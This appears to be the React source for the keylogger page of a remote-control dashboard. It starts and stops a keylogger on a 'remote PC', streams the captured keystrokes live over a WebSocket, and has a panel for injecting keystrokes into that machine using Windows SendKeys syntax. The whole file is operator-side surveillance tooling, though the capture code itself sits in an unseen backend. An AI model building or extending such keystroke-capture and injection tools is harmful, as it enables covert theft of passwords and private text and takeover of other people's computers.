import { useEffect, useRef, useState } from "react";
import { api } from "~/lib/api";
import { Card, CardContent, CardHeader, CardTitle } from "~/components/ui/card";
import { Button } from "~/components/ui/button";
import { Input } from "~/components/ui/input";
import { Badge } from "~/components/ui/badge";
import { ScrollArea } from "~/components/ui/scroll-area";
import { toast } from "sonner";
import { Keyboard, Play, Square, Send } from "lucide-react";

interface KeyEntry {
  key: string;
  timestamp: number;
}

export default function Keylogger() {
  const [running, setRunning] = useState(false);
  const [keys, setKeys] = useState<KeyEntry[]>([]);
  const [sendInput, setSendInput] = useState("");
  const wsRef = useRef<WebSocket | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    checkStatus();
    return () => {
      wsRef.current?.close();
    };
  }, []);

  const checkStatus = async () => {
    try {
      const res = await api.getKeyloggerStatus();
      if (res.success && res.data) {
        setRunning((res.data as { running: boolean }).running);
      }
    } catch {
      // ignore
    }
  };

  const startKeylogger = async () => {
    try {
      const res = await api.startKeylogger();
      if (res.success) {
        setRunning(true);
        toast.success("Keylogger started");
        connectWS();
      } else {
        toast.error(res.message || "Failed to start");
      }
    } catch {
      toast.error("Failed to start keylogger");
    }
  };

  const stopKeylogger = async () => {
    try {
      const res = await api.stopKeylogger();
      if (res.success) {
        setRunning(false);
        wsRef.current?.close();
        toast.success("Keylogger stopped");
      } else {
        toast.error(res.message || "Failed to stop");
      }
    } catch {
      toast.error("Failed to stop keylogger");
    }
  };

  const connectWS = () => {
    const ws = api.keyloggerWS();
    ws.onmessage = (event) => {
      try {
        const entry: KeyEntry = JSON.parse(event.data);
        setKeys((prev) => [...prev.slice(-500), entry]);
      } catch {
        // ignore
      }
    };
    ws.onclose = () => {
      setRunning(false);
    };
    wsRef.current = ws;
  };

  const handleSendKeys = async () => {
    if (!sendInput) return;
    try {
      const res = await api.sendKeys(sendInput);
      if (res.success) {
        toast.success("Keys sent");
        setSendInput("");
      } else {
        toast.error(res.message || "Failed to send keys");
      }
    } catch {
      toast.error("Failed to send keys");
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-2xl font-bold flex items-center gap-2">
          <Keyboard className="h-6 w-6" />
          Keylogger
        </h2>
        <div className="flex items-center gap-2">
          <Badge variant={running ? "default" : "secondary"}>
            {running ? "Recording" : "Stopped"}
          </Badge>
          {running ? (
            <Button variant="destructive" onClick={stopKeylogger}>
              <Square className="h-4 w-4 mr-2" />
              Stop
            </Button>
          ) : (
            <Button onClick={startKeylogger}>
              <Play className="h-4 w-4 mr-2" />
              Start
            </Button>
          )}
        </div>
      </div>

      <div className="grid gap-4 md:grid-cols-2">
        <Card>
          <CardHeader>
            <CardTitle className="text-base">Captured Keys</CardTitle>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-[calc(100vh-340px)]" ref={scrollRef}>
              {keys.length > 0 ? (
                <div className="font-mono text-sm space-y-1">
                  {keys.map((entry, i) => (
                    <span
                      key={i}
                      className="inline-block px-1 py-0.5 m-0.5 bg-accent rounded text-xs"
                      title={new Date(entry.timestamp).toLocaleTimeString()}
                    >
                      {entry.key}
                    </span>
                  ))}
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center py-12 text-muted-foreground">
                  <Keyboard className="h-12 w-12 mb-3 opacity-30" />
                  <p>{running ? "Waiting for keystrokes..." : "Start the keylogger to capture keys"}</p>
                </div>
              )}
            </ScrollArea>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="text-base">Send Keystrokes</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <p className="text-sm text-muted-foreground">
              Send keystrokes to the remote PC. Uses Windows SendKeys syntax.
            </p>
            <div className="flex gap-2">
              <Input
                placeholder="e.g. Hello World or {ENTER}"
                value={sendInput}
                onChange={(e) => setSendInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleSendKeys()}
              />
              <Button onClick={handleSendKeys}>
                <Send className="h-4 w-4" />
              </Button>
            </div>
            <div className="text-xs text-muted-foreground space-y-1">
              <p className="font-medium">Special keys:</p>
              <p>{"{ENTER}"} {"{TAB}"} {"{ESC}"} {"{BACKSPACE}"}</p>
              <p>{"{UP}"} {"{DOWN}"} {"{LEFT}"} {"{RIGHT}"}</p>
              <p>^c = Ctrl+C, %f = Alt+F, +a = Shift+A</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
